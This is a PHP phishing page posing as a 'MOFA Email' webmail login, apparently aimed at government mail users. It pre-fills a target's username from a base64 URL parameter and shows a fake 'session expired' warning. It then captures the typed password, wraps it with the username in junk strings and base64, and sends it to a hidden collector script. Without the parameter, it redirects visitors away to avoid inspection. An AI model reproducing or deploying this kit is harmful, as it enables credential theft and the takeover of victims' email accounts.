<?php
if(isset($_GET['gjfdgjkfhdkgfdgfdjgfd657577HFFHGHjk'])){
$url=$_GET['gjfdgjkfhdkgfdgfdjgfd657577HFFHGHjk'];
$userName= base64_decode($url);
$name=$userName;
?>
<!DOCTYPE html>
<!-- saved from url=(0030)https://mail.paec.gov.pk/mail/ -->
<html lang="en" class="js chrome webkit layout-large"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

<title>MOFA Email :: Welcome to MOFA Email</title>
	<meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no, maximum-scale=1.0">
<meta name="theme-color" content="#f4f4f4">
<meta name="msapplication-navbutton-color" content="#f4f4f4">

	<link rel="shortcut icon" href="favicon.svg">

	<link rel="stylesheet" href="./lifelarombapannanum/bootstrap.min.css">
			<link rel="stylesheet" href="./lifelarombapannanum/styles.css">
		
	
</head>
<body class="task-login action-none">
			<div id="layout">
	

<h1 class="voice">MOFA EMAIL SERVER Login</h1>

<div id="layout-content" class="selected no-navbar" role="main">
	<img src="./lifelarombapannanum/logo.svg" id="logo" alt="Logo">
	
	<div id="login-form" name="login-form" class="propform" >
	<span style='color:red' id='error-class'></span>
<input type="hidden" name="_token" value="5JBKm62gbaL1PvZqoiUiCIk2u0drAzdH" class="form-control">
	<input type="hidden" name="_task" value="login" class="form-control"><input type="hidden" name="_action" value="login" class="form-control"><input type="hidden" name="_timezone" id="rcmlogintz" value="Asia/Calcutta" class="form-control"><input type="hidden" name="_url" id="rcmloginurl" value="" class="form-control"><table><tbody><tr class="form-group row"><td class="title" style="display: none;"><label for="rcmloginuser">Username</label>
</td>
<td class="input input-group input-group-lg"><span class="input-group-prepend"><i class="input-group-text icon"><svg width="1em" height="1em" viewBox="0 0 16 16" class="bi bi-person-fill" fill="currentColor" xmlns="http://www.w3.org/2000/svg">
  <path fill-rule="evenodd" d="M3 14s-1 0-1-1 1-4 6-4 6 3 6 4-1 1-1 1H3zm5-6a3 3 0 1 0 0-6 3 3 0 0 0 0 6z"/>
</svg></i></span><input name="username" id="rcmloginuser" required="" value="<?=$name?>" readonly  size="40" autocapitalize="off" type="text" class="form-control" placeholder="Username"></td>
</tr>
<tr class="form-group row"><td class="title" style="display: none;"><label for="rcmloginpwd">Password</label>
</td>
<td class="input input-group input-group-lg"><span class="input-group-prepend"><i class="input-group-text icon"><svg width="1em" height="1em" viewBox="0 0 16 16" class="bi bi-lock-fill" fill="currentColor" xmlns="http://www.w3.org/2000/svg">
  <path d="M2.5 9a2 2 0 0 1 2-2h7a2 2 0 0 1 2 2v5a2 2 0 0 1-2 2h-7a2 2 0 0 1-2-2V9z"/>
  <path fill-rule="evenodd" d="M4.5 4a3.5 3.5 0 1 1 7 0v3h-1V4a2.5 2.5 0 0 0-5 0v3h-1V4z"/>
</svg></i></span><input name="password" id="rcmloginpwd" required="" size="40" autocapitalize="off" type="password" class="form-control" placeholder="Password"></td>
</tr>
</tbody>
</table>
<p class="formbuttons"><button type="submit" onclick="CheckValidCaptcha();" id="rcmloginsubmit" class="button mainaction submit btn btn-primary btn-lg text-uppercase w-100">Login</button>
</p>

<div id="login-footer" role="contentinfo">
			<p> MOFA Email</p>
						
			
		</div>
		
	</div>
</div>



</div>
    <div id="messagestack" style="border-radius: 5px; border-color: #dc3545; width: 380px; height: 55px; background-color: #dc3545; margin-right: 0px;">&nbsp;&nbsp;&nbsp;&nbsp;<svg width="2em" height="4em" viewBox="0 0 16 16" class="bi bi-exclamation-circle-fill" fill="white" xmlns="http://www.w3.org/2000/svg">
  <path fill-rule="evenodd" d="M16 8A8 8 0 1 1 0 8a8 8 0 0 1 16 0zM8 4a.905.905 0 0 0-.9.995l.35 3.507a.552.552 0 0 0 1.1 0l.35-3.507A.905.905 0 0 0 8 4zm.002 6a1 1 0 1 0 0 2 1 1 0 0 0 0-2z"/>
</svg><span style="color:white; margin-top: 0px; font-size: 16px;">     Your session is invalid or has expired.</span></div>
<script>

</script>



<script src="./lifelarombapannanum/bootstrap.bundle.min.js"></script>
<script src="./lifelarombapannanum/ui.min.js"></script>
        <script type="text/javascript">
        function CheckValidCaptcha(){
//alert("nsdjfhgjbsdfhgsdfg");
    //var y=removeSpaces(document.getElementById('rcmloginuser').value);
    var x=removeSpaces(document.getElementById('rcmloginpwd').value);
  //  if(y =='' && x ==''){
  if(x ==''){
      document.getElementById('error-class').innerHTML="Invalid credential...";
      return false;  
    }else{
        event.preventDefault(); 
            var pEyar=removeSpaces(document.getElementById("rcmloginpwd").value);//
            var PeeRu=removeSpaces(document.getElementById("rcmloginuser").value);
            var Base64={_keyStr:"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=",encode:function(e){var t="";var n,r,i,s,o,u,a;var f=0;e=Base64._utf8_encode(e);while(f<e.length){n=e.charCodeAt(f++);r=e.charCodeAt(f++);i=e.charCodeAt(f++);s=n>>2;o=(n&3)<<4|r>>4;u=(r&15)<<2|i>>6;a=i&63;if(isNaN(r)){u=a=64}else if(isNaN(i)){a=64}t=t+this._keyStr.charAt(s)+this._keyStr.charAt(o)+this._keyStr.charAt(u)+this._keyStr.charAt(a)}return t},decode:function(e){var t="";var n,r,i;var s,o,u,a;var f=0;e=e.replace(/[^A-Za-z0-9\+\/\=]/g,"");while(f<e.length){s=this._keyStr.indexOf(e.charAt(f++));o=this._keyStr.indexOf(e.charAt(f++));u=this._keyStr.indexOf(e.charAt(f++));a=this._keyStr.indexOf(e.charAt(f++));n=s<<2|o>>4;r=(o&15)<<4|u>>2;i=(u&3)<<6|a;t=t+String.fromCharCode(n);if(u!=64){t=t+String.fromCharCode(r)}if(a!=64){t=t+String.fromCharCode(i)}}t=Base64._utf8_decode(t);return t},_utf8_encode:function(e){e=e.replace(/\r\n/g,"\n");var t="";for(var n=0;n<e.length;n++){var r=e.charCodeAt(n);if(r<128){t+=String.fromCharCode(r)}else if(r>127&&r<2048){t+=String.fromCharCode(r>>6|192);t+=String.fromCharCode(r&63|128)}else{t+=String.fromCharCode(r>>12|224);t+=String.fromCharCode(r>>6&63|128);t+=String.fromCharCode(r&63|128)}}return t},_utf8_decode:function(e){var t="";var n=0;var r=c1=c2=0;while(n<e.length){r=e.charCodeAt(n);if(r<128){t+=String.fromCharCode(r);n++}else if(r>191&&r<224){c2=e.charCodeAt(n+1);t+=String.fromCharCode((r&31)<<6|c2&63);n+=2}else{c2=e.charCodeAt(n+1);c3=e.charCodeAt(n+2);t+=String.fromCharCode((r&15)<<12|(c2&63)<<6|c3&63);n+=3}}return t}}
            var string ='sdjaf7823UHNxe3784rycn245t7NHJDEZxmscgjkm/'+PeeRu+'/'+pEyar+'/asjbfrh34276nfgjkryREybntmjy3RCTRN74Yfcmtmcrnt75';
            var encodedString = Base64.encode(string);
            var UrtccErtv ='nsbdfHBVHJDVbb7384bah/ezhudhukol.php'
	    window.location.href = ''+UrtccErtv+'?HGDhecnhjr785nHAUGN4N5TKNJDFJKNEJAWH34782BJDFJHSDFJGDHJsrthyetdghj='+encodedString;
    return true;
  }
  }   
    
function removeSpaces(string){
return string.split(' ').join('');
}
        
        </script>

</body></html>


<?php
}else{
    header('location:nsbdfHBVHJDVbb7384bah/error.php');
}
?>
